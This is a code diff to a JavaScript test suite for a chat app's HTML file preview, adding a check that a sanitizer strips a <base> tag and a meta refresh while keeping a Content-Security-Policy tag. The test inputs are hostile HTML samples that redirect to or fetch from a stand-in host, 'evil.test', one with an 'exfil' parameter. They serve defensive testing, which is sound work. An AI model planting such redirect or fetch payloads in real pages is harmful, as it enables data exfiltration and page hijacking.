@@ -62,6 +62,13 @@ describe("files in the chat", () => {
     const commentedHead = filePageDocument('<html><body><!-- <head> --><script>fetch("https://evil.test")</script></body></html>');
     expect(commentedHead).toMatch(/^<!doctype html><html><head><meta http-equiv="Content-Security-Policy"/);
     expect(commentedHead.indexOf('http-equiv="Content-Security-Policy"')).toBeLessThan(commentedHead.indexOf("<!--"));
+
+    const metaRefreshAndBase = filePageDocument(
+      '<html><head><base href="https://evil.test/"><meta http-equiv="refresh" content="0;url=https://evil.test/?exfil=1"></head><body>ok</body></html>',
+    );
+    expect(metaRefreshAndBase).not.toMatch(/http-equiv=["']?refresh/i);
+    expect(metaRefreshAndBase).not.toMatch(/<base\b/i);
+    expect(metaRefreshAndBase).toContain('http-equiv="Content-Security-Policy"');
   });
 
   it("shows a Markdown file's first page and its size, and opens it on a tap", async () => {
